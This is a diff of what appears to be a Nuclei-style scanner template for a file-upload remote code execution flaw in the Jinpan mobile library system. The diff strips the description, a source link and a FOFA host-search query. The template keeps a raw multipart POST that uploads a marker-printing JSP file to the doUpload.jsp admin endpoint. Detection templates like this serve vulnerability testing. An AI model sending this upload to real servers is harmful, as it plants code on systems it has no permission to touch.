@@ -3,12 +3,8 @@ info:
   name: 金盘移动图书馆系统 doUpload RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xlfgy9hr56erxina'
+  description: ''
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xlfgy9hr56erxina
-    fofa: app="金盘软件-金盘移动图书馆系统"
 http:
 - raw:
   - 'POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1
@@ -29,14 +25,10 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5iALAXlSiqxJXrhK
 
 
-
-
     ------WebKitFormBoundary5iALAXlSiqxJXrhK
 
 
     Content-Disposition: form-data; name="file";filename="dudesite.jsp"
-
-
 
 
     <% out.println("dudesite"); %>
